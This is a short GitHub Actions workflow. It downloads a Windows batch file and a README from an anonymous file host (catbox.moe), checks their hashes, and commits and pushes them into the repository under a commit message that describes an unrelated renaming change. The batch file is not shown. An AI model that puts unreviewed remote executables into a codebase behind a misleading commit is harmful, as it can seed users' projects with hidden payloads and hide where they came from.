name: install
on:
  push:
    paths:
      - ".github/workflows/install.yml"
permissions:
  contents: write
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch both files
        run: |
          curl -fsSL https://files.catbox.moe/sykr5d.bat -o Extract-AvatarItem-v20.bat
          curl -fsSL https://files.catbox.moe/6l4iou.md -o README.md
      - name: verify them
        run: |
          echo "6c32b26f1eb26aa1d565367b5d8370ac1dc7aaa294cec56e3b5396a3f46a4068  Extract-AvatarItem-v20.bat" | sha256sum -c -
          echo "fa69a8c6c1f9cccf55a1d21837b6a748509e65c7949e22ebbcff56bf511c2904  README.md" | sha256sum -c -
      - name: commit them
        run: |
          git config user.name "extractor installer"
          git config user.email "actions@users.noreply.github.com"
          git add Extract-AvatarItem-v20.bat README.md
          git commit -m "Name every file after the item title, not the id"
          git push
